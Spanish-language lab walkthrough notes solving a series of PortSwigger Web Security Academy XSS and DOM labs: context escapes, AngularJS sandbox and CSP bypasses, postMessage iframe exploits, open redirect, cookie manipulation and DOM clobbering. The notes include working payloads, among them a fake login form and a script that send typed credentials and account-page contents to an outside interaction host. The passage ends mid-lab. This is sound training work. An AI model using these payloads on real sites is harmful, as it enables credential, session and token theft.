viendo esto podemos intentar otro enfoque y es cerrar la etiqueta script para salir de ese contexto:
![[Pasted image 20250907230428.png]]

Vemos que si nos interpreta el cierre de la etiqueta y el resto del código queda colgado, en este punto lo que vamos a hacer es insertar otra etiqueta luego del cierre y ver si lo interpreta:
![[Pasted image 20250907230534.png]]
Ya no es necesario ni revisar el código ya que vemos que aparece el Hola con los `h1` intepretados.
En este punto ingresamos el alert:

![[Pasted image 20250907230635.png]]
![[Pasted image 20250907230645.png]]Perfecto si se ejecuto:
![[Pasted image 20250907230708.png]]
Lab Terminado.

### Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

Este es un laboratorio muy similar al anterior con la diferencia de que en este también se escapa lo que es `<>,'` por lo que si intentamos cerrar la comilla veremos lo siguiente:

![[Pasted image 20250907231422.png]]
Vemos que nos escapa la comilla por lo que no podemos salir de ese englobe, pero podemos tratar de a ese escape de comilla provocarle un escape para que se escape el backspace y la comilla quede cerrando, permitiendo que nosotros podamos ejecutar código dentro de la web:

![[Pasted image 20250907231606.png]]
Perfecto si se pudo por lo que ya podemos ingresar el alert() o lo que necesitemos como dato tenemos que usar esa comilla que queda colgada en algo para que no nos de problemas y en mi caso la inyección queda de la siguiente manera:
![[Pasted image 20250907232459.png]]
En este caso jugamos con operatorias además de comentar el resto del código debido a que nos queda una comilla colgada la cual no se logra cerrar por el aumento del `\` fuera de contexto por lo tanto preferible lo comentamos y listo:

![[Pasted image 20250907232511.png]]
![[Pasted image 20250907232522.png]]
Lab Terminado

### Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

Este laboratorio ya se complica bastante ya que tiene todo escapado, el propósito será buscar la forma de inyectar código JavaScript  además tenemos que tener en cuenta que no siempre fue en los demas laboratorios de las etiquetas `script`, en donde se pasa esto dice que es al hacer click en el nombre y recordemos que el nombre esta asociado al link que definimos la dejar un comentario por lo tanto puede tratarse de ese campo:

![[Pasted image 20250907233033.png]]
![[Pasted image 20250907233147.png]]
viendo esto podemos intentar ver si podemos escapar mediante una comilla u otros métodos pero no va a funcionar.

Ahora nosotros podemos llegar a representar las comillas por ejemplo pero mediante otros métodos como por ejemplo mediante el `&apos;` vamos a intentarlo a ver que logramos:
![[Pasted image 20250907233743.png]]
![[Pasted image 20250907233823.png]]
Perfecto logramos representar la comilla de forma exitosa ahora siguiendo la sintaxis que se esta definiendo podemos intentar completar algunas cosas y así ejecutar un alert de la siguiente manera:
![[Pasted image 20250907234121.png]]
![[Pasted image 20250907234214.png]]
Perfecto al parecer lo hicimos correcto ahora podríamos dar click ya que si vemos es en el evento `onclick` cuando se ejecuta:
![[Pasted image 20250907234303.png]]
![[Pasted image 20250907234314.png]]
Lab Terminado.

### Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

En este punto tenemos todo lo anterior sanitizado por lo que toda inyección usual va a ser inservible, en este punto tenemos que comprender un concepto clave y es que en JavaScript podemos usar un tipo de comilla especial llamado `backticks` que son las comillas inclinadas, cuando se usa este tipo de comilla es imposible salir de ese tipo de contexto, pero para insertar contenido dentro de esta lo hacemos mediante `$()`. Ahora si ello no esta sanitizado todo lo que se encuentre dentro de ello será llamado o ejecutado:

![[Pasted image 20250909085926.png]]
Como podemos observar al ingresar información de esa forma nos realiza la operación, en este punto podemos inyectar un alert(0):
![[Pasted image 20250909090043.png]]
![[Pasted image 20250909090057.png]]
Lab Terminado.

### Lab: Exploiting cross-site scripting to steal cookies

En este lab el objetivo es robar cookies de sesión.

actualmente el Burpsuite no me permite hacer uso de collaborator para recibir peticiones a un servidor o vps  del mismo BurpSuite, en este caso podemos hacer uso de la siguiente herramienta: https://github.com/projectdiscovery/interactsh para poder resolver el lab.

El lab no tiene ninguna protección por lo que podemos inyectar código como nos plazca así que lo único a tener en cuenta para obtener la cookie es que usaremos `document.cookie` y listo de la siguiente manera:

![[Pasted image 20250909095240.png]]

esa petición al tener una url almacenada lo que va a ocurrir es que cuando ingresemos a la web y cargue esas instrucciones a nuestro vps vamos a ver como nos llega una petición con la cookie de usuario:
![[Pasted image 20250909095417.png]]

Eso esta bien pero tenemos que saber que por practicidad para cualquier otro tipo de datos podemos intentar obtener todos los datos en base64 ya que es mucho mas practico y podemos hacerlo de la siguiente manera:

![[Pasted image 20250909095754.png]]
Solo usamos `btoa` que nos permite en JavaScript pasar la información a base64.

Ahora vemos la respuesta:
![[Pasted image 20250909100156.png]]
Como podemos observar ya tenemos en base64, seria cuestión de pasarlo a texto normal y listo:

![[Pasted image 20250909100554.png]]
Ya con esto podemos completar el LAB.

### Lab: Exploiting cross-site scripting to capture passwords

Así como hemos hecho para capturar lo que son usuarios y contraseñas.

El objetivo será hacerle creer al usuario que tiene que iniciar sesión para ver el post pero en realidad no es necesario las credenciales nos la enviara a nosotros.
En este caso va a ser algo muy básico pero el objetivo es que sea funcional, lo que vamos a inyectar en este caso es lo siguiente:
```html
Introduce tus credenciaels para ver el post: <br><br>

Usuario: <input type="text" name="username" id="username"
  onchange="fetch('https://d30595q87m3cdkmh5fi0ix5q6mpfjxghz.oast.me/?username=' + this.value)"><br><br>
Password: <input type="password" name="password" id="password"
  onchange="fetch('https://d30595q87m3cdkmh5fi0ix5q6mpfjxghz.oast.me/?password=' + this.value)">
```

Esto lo vamos a inyectar en el campo de comentario quedando:
![[Pasted image 20250909112817.png]]
Listo lo enviamos y vemos que es lo que tenemos:
![[Pasted image 20250909112923.png]]
 ahora si alguien ingresa sus datos nos llegara una petición con los mismos:
 ![[Pasted image 20250909113026.png]]
Con esto ya tenemos el Lab Terminado.


### Lab: Exploiting XSS to bypass CSRF defenses

Este laboratorio tiene como objetivo el obtener un CSRF token válido el cual nos permita el cambio de de email de cualquiera de las personas que están registradas en el blog.

Como para tener en cuenta los CSRF token son valores generados de forma única para los usuarios, estos permiten que en los sitios web no se falsifiquen peticiones por usuarios ya registrados, evitando que personas externas mediante vulnerabilidades como la XXS puedan realizar diferentes cosas.

Para esto laboratorio nos dan credenciales con las cuales podemos iniciar sesión que son `wiener:peter` así que lo primero que vamos a hacer es ingresar con esas credenciales:

![[Pasted image 20250909114343.png]]
Vemos que al ingresar tenemos una opción para actualizar nuestro correo, vamos a intentar cambiarlo pero a esta petición vamos a interceptarla con BurpSuite para poder ver como se tramita:

![[Pasted image 20250909114553.png]]
Vemos que si se genero el `csfg` que es el CSRF token generado y lo que podemos pensar es que cada usuario genera uno y con este podríamos cambiar datos.

En este caso es estático y no siempre lo es pero bueno, en caso de que sea estático lo que tenemos que hacer es obtenerlo, para esto el Laboratorio no va a tener ninguna seguridad por lo que vamos a podemos crear con etiquetas `script` algo que nos permita obtener este valor como por ejemplo el siguiente código:

```html
<script>
  var req = new XMLHttpRequest();
  req.open("GET", "/my-account", false);
  req.send();
  var response = req.responseText;
  var req2 = new XMLHttpRequest();
  req2.open("GET", "http://d306qvq87m3ab4ksvu30cpmszdsa8gqsx.oast.online/?response=" + btoa(response));
  req2.send();
</script>
```

El punto de este script es que con el primer es que con la primera petición mandar a llamar a la web de `/my-acout` que es donde tenemos la petición para cambiar de correo, a esto obtenemos todo el contenido de la respuesta y lo traemos mediante una petición en base64 con una segunda petición a nuestro servidor, ahora esto lo ponemos en el comentario del post y lo enviamos:

![[Pasted image 20250909131248.png]]
Listo enviemos esto y veamos que sucede:

![[Pasted image 20250909131711.png]]
vemos que llegan peticiones donde en base64 ya tenemos la información, con esto claro lo que podemos hacer es sacar el token una base pasado a texto normal y listo Lab Terminada.


### Lab: Reflected XSS with AngularJS sandbox escape without strings

Bueno primero tenemos que tener claro que `sanbox` y no es mas que unos mecanismos de seguridad y aislamientos para limitar lo que se puede hacer dentro de las expresiones de angular con el objetivo de mitigar riesgos existentes como los ataques XSS. Entonces el objetivo es salir de ese sandbox que se esta ejecutando.

Lo primero es identificar la tecnología con el objetivo de estar seguro el lenguaje que se esta empleando:
![[Pasted image 20250909202716.png]]
Otra forma usada por consola puede ser:
![[Pasted image 20250909202753.png]]

Perfecto con esto ya tenemos claro que se emplea angular.

Bueno buscando por algo vulnerable para esa version vemos lo siguiente:
![[Pasted image 20250909203032.png]]

Pero vamos a desglosar cada parte para entender como ocurre la vulnerabilidad.

Antes de pasar a la cadena conceptos claves, tenemos que comprender que nosotros buscamos vulnerabilidades de código lo que quiere decir que siempre buscamos código vulnerable, con esto claro la vulnerabilidad que acontece es que lo que tenemos en la url pasa por un proceso algo extraño que le permite a todo parámetro ser interpretado, esto quiere decir que los parámetros en la url que se le pacen pasaran por un proceso que permite la interpretación, esto es algo muy util a tener en cuenta ya que nosotros en un entorno tenemos que probar absolutamente todo para intentar lograr inyectar algo y que eso se reproducible.

Ahora con respecto a la inyección tenemos que `toString().constructor.prototype.charAt=[].join` lo que hace es cambiar el funcionamiento de la función `charAt` ya que en estas versiones de angular lo que suele hacerse es que con esta función separa nuestro input y evalúa que no tenga ciertas palabras, pero al dejar esta función sin su forma principal de funcionar lo que hacemos es evitar el correcto funcionamiento de la protección.

Ahora el `[1,2|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)` en este punto hacemos una jugada maestra y es que con el array inicial `[1,2]` lo ordenamos con ayuda del `orderBy` pero lo que hacemos a continuación es cambiar el criterio de ordenamiento con el que se va a realizar y dentro de este criterio de ordenamiento incrustamos esos números que en realidad con ayuda del ultimo `.fromCharCode()` los convertimos en tiempo a cadena que es un `x=alert(1)` y esto es un criterio de asignación donde para darle un valor lo debe evaluar, es aquí donde se genera esa inyección de forma especifica y logramos sobrepasar el sandbox. Vamos a ver en un convertidor esos números solo para que quede claro su valor:
![[Pasted image 20250909210324.png]]

ahora ya conociendo que es lo que esta pasando podemos intentar la inyección dentro de lab:
![[Pasted image 20250909210612.png]]

![[Pasted image 20250909210628.png]]

Listo lab Terminado.

### Lab: Reflected XSS with AngularJS sandbox escape and CSP

El propósito es general salir del sandbox pero ahora tenemos que escapar también del CSP ( Content Security Policy ) que es una función de seguridad que ayuda a evitar los ataques del tipo XSS.

En este punto intentamos de todo y bueno nada de lo conocido funciona.

En este punto lo primero que vamos aver es las CSP definidas en web y esto lo hacemos revisando la primera petición que se hace al recurso de la web:
![[Pasted image 20250909211351.png]]

Lo primero que hacemos es ver que esta definido y en nuestro caso es lo siguiente:
![[Pasted image 20250909211501.png]]
Revisando esos permisos vemos en realidad una explicación del porque no se ejecutan algunas acciones.

En este caso podemos buscar por payloads o código maliciosos a probar y en este caso vamos a provecharnos del siguiente:
![[Pasted image 20250909211801.png]]
Esto es dado a que el lab nos pide enviar a una maquina victima lo que vamos a hacer es con ayuda del `#` hacer focus directamente y activar el evento, así que vamos a configurarlo:
![[Pasted image 20250909212422.png]]

En este punto cosas a tener en cuenta son los espacios y las comillas, a estos hacer url encode para que no tengamos conflictos, además de esto modificamos el 1 del alert por la petición de la cookie como lo pide de lab.
![[Pasted image 20250909212532.png]]
Lab Terminado.

### Lab: Reflected XSS with event handlers and href attributes blocked

En este laboratorio nos vamos a centrar en la inyección donde a un vector vamos a dale el valor de click para que un usuario al darle click se inyecte código.

Esto tiene una lista blanca de etiquetas, donde se incluyen etiquetas como `svg animate y a` para crear de la siguiente manera el payload:
```html
<svg><a><animate attributeName=href values=javascript:alert(0) /><text x=30 y=30>Click me!</text></a>
```

![[Pasted image 20250909214948.png]]

![[Pasted image 20250909215004.png]]

Lab Terminado.


### Lab: Reflected XSS in a JavaScript URL with some characters blocked

En este punto lo que vemos es una inyección que parece normal pero no se ejecuta debido a que algunos caracteres son cambiados para evitar las inyecciones.

En este punto vamos a analizar un poco como tenemos montado el lab y es que el botón de back o regresar al entrar a algún post esta realizado de una forma algo particular:
![[Pasted image 20250910092946.png]]
Podemos observar que el enlace de `back to Blog` para retroceder realiza una petición por POST a la raíz, lo que en teoría carga el index que seria el home y listo.

Ahora viendo la estructura nosotros podemos intentar cerrar el contexto de la petición con una `'` y el `}` para serrar la función.
Ahora conceptos importantes nosotros en JavaScript podemos pasarle mas valores de los definidos o usados en una función, el echo de que no se estén usando no quiere decir que no se encuentren allí, tomando eso en cuenta lo que sucede en el momento de definir algo o pasarle algo a la función es que todos lo que se le pase primero lo evalúa o ejecuta para obtener un valor y eso pasarle a la función por lo cual si nosotros pasamos un `console.log(19)` a una función se interpreta y ejecuta el `console.log(19)` y luego se llama la función con el resultado y si tiene errores lo detecta y mas pero siempre evalúa diferentes operatorias antes de llamar a la función.

Perfecto nosotros justo lo que vamos a intentar cerrar es el espacio donde se le pasa valores a la función por lo tanto el objetivo es cerrar el segundo valor por decirlo y agregar otro mas.

Entonces lo que hacemos es `'}` para serrar el contexto del segundo parámetro a pasar nos queda colgado `'}` al final entonces primero vamos agregar algo sencillo por ejemplo `,{x:'` que esto nos permite utilizar el valor final de `'}` quedando como `'},{x:''}` entonces la petición ya tiene otro valor mas anidado, si lo intentamos, veamos si podemos hacerlo:
![[Pasted image 20250910095939.png]]
puede que algo este entrando en conflicto así que hagamos un url-encode a las comillas primero a ver que sucede:
![[Pasted image 20250910100102.png]]
Lo hicimos con `%27` que es el valor de el `url-encode` pero nos lo quita y pone las comillas simples.
En este punto puede ser que para concatenar correctamente la petición se necesite de algún parámetro valido al igual que como cuando queremos usar algún parámetro y usamos  `?` podemos intentar buscar uno valido, para esto usaremos [[Wfuzz]] y veremos si logramos encontrar el valido:
```bash
wfuzz -c -w /usr/share/seclists/Fuzzing/special-chars.txt 'https://0a8400c304df07c781e0751a006a00b1.web-security-academy.net/post?postId=3FUZZ%27} ,{x:%27'
```
En este caso es necesario poner en url-encode las comillas y vemos que nos reporta:
![[Pasted image 20250910100416.png]]
Vemos dos valido y por tiempo el util es el  `&` por lo que vamos a ver si ya con esto logramos la inyección:
![[Pasted image 20250910100528.png]]
ya nos carga la web de forma correcta y vemos que el código se inserto de forma correcta por lo que ya vamos por buen camino.

En este punto ya tenemos una parte inyectable que es a la izquierda de la definición, entonces el punto donde vamos a inyectar exactamente es: `&'},aqui,{z:'` por lo tanto vamos a ver si podemos ejecutar un alert desde allí:
![[Pasted image 20250910100852.png]]
no vemos la alerta y al revisar vemos que nos sale el alert1 sin los paréntesis esto quiere decir que por detrás algunos caracteres están bloqueados o están siendo remplazado por nada lo que provoca que no se ejecute la alerta.

Un concepto que tenemos que tener claro es sobre las `arrow function` la cual es una sintaxis diferentes y compacta para declarar una función que funciona de la misma manera que una función normal ahora estas funciones a menos que se use o se le pase mas de 1 valor no es necesario usar los paréntesis permitiendo hacer lo siguiente:
```javascript
// Funcion normal
function x(){
	console.log(2)
}
// Funcion flecha
x = x => {console.log(2)}
```

ahora una llamada de la que podemos provecharnos es el `throw` el cual es una forma de lanzar excepciones pero con la cual podemos jugar de la siguiente forma:
```javascript
x = x => {
	throw onerror=console.log,9;
}
```

Throw de por si es una excepción con `onerror` lo que hacemos es controlar el error e igualarlo a un `console.log` al momento de que se envía el error lo que hace es que el se interpreta el erro como un `console.log` y le pasa el valor de 9 realizando el `print` del valor en la consola. Ahora bien ese console.log nosotros lo podemos cambiar por algo un poco mas util como el `alert` quedando:

```javascript
x = x => {
	throw onerror=alert,9;
}
```

Perfecto ahora por concepto las funciones tiene que ser llamadas y para hacerlo se suele usar algo como `x();` pero las comillas no se las puede usar entonces tenemos que ver una alternativa.

Tenemos que comprender otra cosa JavaScript es un lenguaje de tipado dinámico al cual no es necesario definirle el tipo de dato que se quiere usar por lo que cuando por ejemplo queremos hacer `'hola' + 2` sumar un String y un int lo que hace por detrás es convertir ese 2 de entero a string con `.toString` ahora nosotros podemos tratar de sobre escribir la función `toString` por momentos donde lo podemos decir `toString=x` lo que lo igual a nuestra función y para forzar que este tu string sea llamado podemos usar la suma anterior, provocando que el `toString` ejecute nuestra función.

Ahora vamos a ver todo junto y en una sola línea:
```javascript
x=x=>{throw/**/onerror=alert,9},toString=x,window+''
```

los `/**/` es para dar un comentario y lo  que esperamos es generar un espacio para evitar errores, además usamos una variable existente que es `window` forzar si o si la conversion.

En este punto vamos a ver que sucede, algo extra es que el `+` puede que si como que no sea necesario hacerlo url-encode, en este caso si fue necesario:
![[Pasted image 20250910103621.png]]
No realiza el lanzar el alert pero vemos que si se resuelve la maquina, esto es porque recordemos que la ejecución de esto esta al arrastrarse dentro de ese enlace por lo que podemos revisar a ver que tenemos y ver si podemos al darle click ejecutar el alert:
![[Pasted image 20250910103811.png]]
![[Pasted image 20250910103821.png]]

con esto ya tenemos Lab Completada.

### Lab: Reflected XSS protected by CSP, with CSP bypass

Lo primero que encontramos es la inyección de un `marquee` y funciona:
![[Pasted image 20250910110529.png]]

Perfecto, en este punto vamos a ver el código fuente de porque se interpreto:
![[Pasted image 20250910110615.png]]
vemos que aun dentro del h1 sale del contexto e inserta las etiquetas.
Intentamos el alert con la etiquetas `script`:
![[Pasted image 20250910110843.png]]
vemos que si se inserta las etiquetas script pero no se ejecuta el código, esto ya nos da ha sobre entender que tenemos un CSP corriendo por debajo, si nos vamos a consola veamos que tenemos:
![[Pasted image 20250910110949.png]]
Vemos que en este caso tenemos la política de `style-src self` la cual no permite carga de contenido externa o registrada por lo que nuestro objetivo es intentar pasar sobre la politica.

Ahora nuestra sentencia no esta cargando un `src` de tipo elm o style pero nos lo detecta como tal.

Ahora en este punto lo que tenemos que hacer es ver la peticiones que se están efectuando y como lo están haciendo:

![[Pasted image 20250910111623.png]]

vemos que al hacer las peticiones tenemos el aparatado de `content-security-policy` con las seguridades por decirlo de alguna forma aplicadas, pero la ultima es algo llamativa y es que nos indica un `report-url/csp-repor?token=` y si vemos las demás peticiones también vemos que se realizan por post pero llevan ese encabezado, vemos si usando el parámetro `token=algo` podemos inyectar algo las `content-security-policy` :
![[Pasted image 20250910114526.png]]
en efecto podemos pasarle cosas allí sin problema por lo que en parte y de esta forma podemos llegar a controlar el `CSP` de la siguiente manera:
```
;script-src-elem 'unsafe-inline'
```

el `style-src-elem` es el valor que nos esta dando problemas y al pasarle el `unsafe-inline` lo que le decimo es que permitimos el uso de scripts, entonces vamos a inyectar el script y con el token a cambiar las políticas para ver si funciona:

![[Pasted image 20250910115225.png]]

![[Pasted image 20250910115235.png]]

En este caso vemos que logramos la inyección de forma exitosa:
![[Pasted image 20250910115311.png]]
Lab Terminado.


### Lab: DOM XSS using web messages

En este caso tenemos un laboratorio algo un poco fuera de lo común donde por alguna razón la web cuenta con el siguiente script:
```html
<script>
	window.addEventListener('message', function(e) {
        document.getElementById('ads').innerHTML = e.data;
    })
</script>
```

Lo que al parecer intenta el script es que dentro de el elemento `message` se va a insertar información, lo que podemos intentar hacer es que mediante la instrucción en la consola usar `postMessage` y ver si logramos incrustar información:

![[Pasted image 20250914120501.png]]

Estamos insertando información, esto es útil, en estos casos lo que vamos a hacer es intentar diferentes tipos de inyecciones a ver si estas son interpretables:

![[Pasted image 20250914120703.png]]

perfecto, podemos observar como mediante la etiqueta de `img` y jugando con el error de la misma logramos cargar un alert. El objetivo es automatizar mediante un `iframe` donde carguemos la web poder comunicarnos al window de la propia maquina para insertar la inyección.

Cuando ya nos encontramos en otro origen `postMessege()` también tiene otro parámetro mediante el cual se tiene que pasar origen, puertos y datos exactos tal y como si fuera la web, pero esta tiene una opción especial que es el `*` el cual vamos a emplear, vamos a ver:
```html
<iframe src="https://0a53005b0378e314803112a900f2001e.web-security-academy.net/" width="500px" height="600px" onload='this.contentWindow.postMessage("<img src=0 onerror=\"alert(0)\">","*")' ></iframe>
```

lo que hacemos de forma especifica es aprovechar el `onload` de los `iframes` para enviar un mensaje con código malicioso y que cargue un `alert(0)` recordemos también que con la ayuda de el `*` no tenemos que especificar datos de la web que no conocemos para enviar el mensaje.

![[Pasted image 20250914122644.png]]

Ahora vemos si con esto resolvemos el lab:
![[Pasted image 20250914122728.png]]

Perfecto maquina terminada.

### Lab: DOM XSS using web messages and a JavaScript URL

En este caso también comenzamos investigando de que se trata la web y analizándola encontramos en el código fuente lo que es un script que es el siguiente:
```html
<script>
  window.addEventListener('message', function (e) {
    var url = e.data;
    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
      location.href = url;
    }
  }, false);
</script>
```

Vemos que el script en un comienzo es muy similar al del anterior lab, se recibe un mensaje el cual al almacena en la variable url para luego ver si en ella se contiene `http o https` donde si esta si lo contiene va a hacer el `location.href` esto lo que hace es llamar a la web o cargarla, podemos intentarlo en la consola para ver que se puede hacer:
![[Pasted image 20250914123813.png]]
![[Pasted image 20250914123827.png]]
Como podemos ver nos redirige a la web que le pasamos.

Ahora viendo esto de que se esta empleando `href` podemos intentar pasarle `javascript:alert(0)`, el problema radica en el if ya que si no cuenta con `http o https` no va a llegar al href y no se ejecutara nuestro código. Si recordamos eso esta ejecutando un código `javascript` pero y si nosotros definimos una variable la cual contenga `http o https` lograremos pasar esto de la siguiente manera:

![[Pasted image 20250914125631.png]]

Perfecto, estamos pasando de la restricción impuesta y ejecutando el código, con esto valido podemos crear algo similar al código anterior a ver que nos queda de la siguiente manera:
```html
<iframe src="https://0aea00c103a981cf803803f500a400a6.web-security-academy.net/" onload='this.contentWindow.postMessage("javascript:alert(0);let=\"https:\" ","*")'></iframe>
```

![[Pasted image 20250914130146.png]]

Y si esto lo enviamos:
![[Pasted image 20250914130325.png]]

como dato extra también se puede enviar como un comentario para que no se interprete:
```html
<iframe src="https://0aea00c103a981cf803803f500a400a6.web-security-academy.net/" onload='this.contentWindow.postMessage("javascript:print()//let=\"https:\" ","*")'></iframe>
```

Lab Terminado.

### Lab: DOM XSS using web messages and JSON.parse

Mismo objetivo, en este caso lo que vamos a encontrar será el siguiente script:
```js
<script>
  window.addEventListener('message', function (e) {
    var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
    document.body.appendChild(iframe);
    try {
      d = JSON.parse(e.data);
    } catch (e) {
      return;
    }
    switch (d.type) {
      case "page-load":
        ACMEplayer.element.scrollIntoView();
        break;
      case "load-channel":
        ACMEplayer.element.src = d.url;
        break;
      case "player-height-changed":
        ACMEplayer.element.style.width = d.width + "px";
        ACMEplayer.element.style.height = d.height + "px";
        break;
    }
  }, false);
</script>
```

Vemos que este es un script con una mayor complejidad, lo primero es entender que es lo que hace y lo que hace es: captura un mensaje enviado con `postMessage` pero en formato json, luego genera algunos `iframe` con un try va a controlar los errores, pero lo que importa es la variable `d` donde `JSON.parse` esta convirtiendo una variable de formato JSON a objeto por eso sabemos que se esta tramitando en formato JSON, luego analiza el parámetro que se le esta enviando, esto para actual de diferentes formas dependiendo de la solicitud.

Ahora que entendemos un poco como esta interactuando el script lo que vamos a hacer es intentar tramitar un mensaje donde vamos a inyectar código de la siguiente manera:
![[Pasted image 20250914183625.png]]

Podemos ver que logramos inyectar la url en uno de los `iframe`, en este caso lo que vamos es a tratar de ver si nos interpreta código el src:
![[Pasted image 20250914183743.png]]

Perfecto si nos permite la inyección de comandos, con esto en mente lo que vamos a hacer es crear la web maliciosa, la idea y la forma de cargar va a ser parecida a las anteriores con un poco mas de dificultad de la siguiente manera:
```html
<iframe src="https://0a66007d042320309e52db9a000f0014.web-security-academy.net/"
  onload='this.contentWindow.postMessage("{\"type\": \"load-channel\", \"url\":\"javascript:alert(0)\"}","*")'></iframe>
```

Vamos a intentarlo:
![[Pasted image 20250914184354.png]]

![[Pasted image 20250914184326.png]]
Lab Terminado.


### Lab: DOM-based open redirection

El objetivo es en este caso redirigir a la victima a nuestra web maliciosa, eso es `open redirect` en pocas es una vulnerabilidad que permite realizar peticiones a sitios externos como si los hiciera la misma web mas no, nosotros.

analizando el código fuente de la web vamos a ver que el botón para regresar de posts hace algo extraño:
![[Pasted image 20250914185815.png]]

Analicemos, se esta agregando el evento `onclick` al cual se le esta definiendo una variable `returnUrl` al cual con `.exec` se esta filtrando si encuentra lo de `/url=(...)`, en la variable location, que de forma general guarda la url del sitio actual, ahora lo siguiente que hace es lo mismo que en la maquina anterior igualarlo a `localtion.href` donde se realiza una operatoria simple, en `returnUrl` se almacena un array, entonces seria si `returnUrl` tiene contenido del array va a coger el segundo elemento, si no excite le pasa el `/`.

Ya comprendiendo la lógica vamos a comenzar a intentar usar el parámetro `url` en la url y vemos si primero logramos un open redirect:
![[Pasted image 20250914191518.png]]
Perfecto es fue válido como podemos ver se inyecto dentro de la url por lo cual ahora vamos a insertar el link de nuestro exploit a ver que sucede:
![[Pasted image 20250914191644.png]]
Perfecto:
![[Pasted image 20250914191711.png]]
Lab Terminado.


### Lab: DOM-based cookie manipulation

el punto es tratar de inyectar comandos manipulando la cookie para esto lo que vamos a hacer es primero capturar la petición a ver que tenemos:

![[Pasted image 20250914192048.png]]

no vemos en si nada lo cual pueda se pueda inyectar de primeras, vamos a navegar un poco en la web a ver que descubrimos:

Analizando un poco vemos que  tenemos el siguiente enlace:
![[Pasted image 20250914192522.png]]

Eso nos envía al ultimo producto visitado, pero en si con hovering no logramos ver del todo el link entonces vamos a capturar lo que se tramita para entender que esta sucediendo por detrás y talvez ver como esta almacenando la información:

![[Pasted image 20250914192721.png]]

Ya aquí vemos algo extraño y es que en las cookies se esta almacenando la `url` del ultimo  producto, ahora deberíamos revisar como se esta implementando esto ya que si es con `href` mediante un `javascript:<comando>` se podría implementar una inyección:

![[Pasted image 20250914193104.png]]

Si se implementa un `href`, no se va a poder inyectar directamente el comando, pero veamos si logramos cerrar el link, tratemos de salir de ese enlace:
![[Pasted image 20250914193516.png]]
![[Pasted image 20250914193459.png]]

Perfecto si logramos inyectar la comilla así que vamos a intentar insertar un h1:
![[Pasted image 20250914193600.png]]
![[Pasted image 20250914193623.png]]
![[Pasted image 20250914193712.png]]

Perfecto ya estamos inyectando información, en este punto lo que vamos a intentar hacer es recrear una etiqueta `script` para inyectar los comandos:
![[Pasted image 20250914193830.png]]

Excelente si se puede, en este punto lo que vamos a intentar hacer es crear la web maliciosa donde vamos a automatizar este proceso para poder inyectar el comando, y nos quedaría de la siguiente manera:

![[Pasted image 20250914194948.png]]

Eso esta funcionando pero al parecer realiza como en ciclo varias redirecciones y esto evita que cargue correctamente el exploit, vamos a solucionar esto definiendo una estructura de la siguiente manera:
```html
<iframe src="https://0a73000204dfba028225f1ca000500ce.web-security-academy.net/product?productId=2&'><script>print()</script>" onload="if(!window.x)this.src='https://0a73000204dfba028225f1ca000500ce.web-security-academy.net/';window.x=1"></iframe>
```

con esto se resuelve el Lab pero no me funciona por lo tanto:
Lab Terminado

### Lab: Exploiting DOM clobbering to enable XSS

Nos dicen que la vuln la tenemos en la sección de comentarios:
![[Pasted image 20250914204158.png]]
Nos dice que html es valido pero vemos que hace al insertarlo:
![[Pasted image 20250914204230.png]]

Pues si lo interpreta e inserta, ahora lo que se puede hacer es intentar diferentes tipos de  XSS a ver si alguno es permitido.

![[Pasted image 20250914204401.png]]
![[Pasted image 20250914204418.png]]

No se dio ninguno de los dos campos por lo que al parecer tener restricciones talvez.

![[Pasted image 20250914204706.png]]

Se están cargando dos scripts, el uno es `domPurify` el cual es un desinfectante para evitar `XSS` y el otro es algo llamativo ya que no es nada completamente conocido por lo que lo primero que vamos a revisar es el `loadCommentsWithDocmClobbering`, nos lo traemos a local y veamos que obtenemos:
![[Pasted image 20250914204916.png]]

Perfecto ya con el archivo en local lo que tenemos que analizarlo y entender que es lo que hace, vamos a resaltar lo mas importante:
Puntos claves, el como se carga el avatar ya que si nos fijamos detenidamente en el código que es el siguiente:

![[Pasted image 20250914210937.png]]

Podemos observar primero que `window.defaultAvatar` esta llamando al elemento avatar de forma general, y si no encuentra carga por defecto una imagen.
Luego podemos ver que esta creando la etiqueta del html de forma que al `src=` le asigna el valor mediante un condicional ternario donde si `comment.avatar` tiene contenido se cargar ese escapando todo lo que sean etiquetas y cosas que pueden acontecer un xss y si pues no tiene contenido cargar directamente el `defaultAvatar.avatar`.

Es aquí donde buscamos el acontecer el XSS ya que si nosotros logramos ingresar contenido dentro del ese `src` podemos romper y acontecer el XSS y el error de forma especifica es como de forma global del contenido de la web llama a `window.defaultAvatar` esta forma de invocar elementos cambia dependiendo del numero de elemento, entonces si tenemos uno no pasa mucho pero si se define otro?.

Es aquí el concepto completo de DOM clobbering ya que va a cambiar esto ya no es el objeto en si sino ahora teniendo 2 o mas lo que se obtiene es un array con todos los elementos:
![[Pasted image 20250914211818.png]]
En la imagen se explica un poco mejor el concepto, lo que sucede es que cuando tenemos multiples campos definidos nos retornara una collection de todos los elementos pero recordemos que se esta usando una declaración `defaultAvatar.avatar` cuando no encuentra otro imagen a cargar, si revisamos lo encerrado en la imagen cuando se tiene varias definiciones de elementos con el mismo `id` en este caso pero uno tiene un `name` se puede referenciar con el `.` y es de esta forma como obtenemos el elemento especifico no `id y name`, ahora recordemos que JavaScript esta sumando cadenas y la declaratoria retorna una elemento, lo que JavaScript ara es intentar transformar este elemento en cadena y cuando esto pase no tendremos nada:

![[Pasted image 20250914212230.png]]

Lo que JavaScript hace por detrás es aplicar ese `toString()` y compactar pero no tenemos nada, en el caso de los enlaces podemos usar `href` para definirle un valor:
![[Pasted image 20250914212348.png]]

Entonces ya tenemos por donde intentar la inyección de la siguiente manera:
![[Pasted image 20250914213722.png]]

Tenemos un problema y es que se esta definiendo la image de forma relativa, me refiero que va desde la ruta actual de la maquina:
![[Pasted image 20250914213810.png]]

En este punto lo que tenemos que hacer es buscar la forma de que no nos url-encode `"` que es el %22 que vemos en la url, eso provoca que no se cierre.


Lo que se nos ocurre es que se url-encode por el script del `dompurify` y en realidad si ya que por donde primero pasa el comentario es por el  `dompurify`.

Ahora algo que no es muy común que se sepa es que `dompurify` admite el uso de un protocolo llamado `cid:` el cual le indica que no tiene que `url-encode` algo, entonces vamos a intentar pasarle esto a ver que podemos obtener:
![[Pasted image 20250914214751.png]]

vemos que sucede:
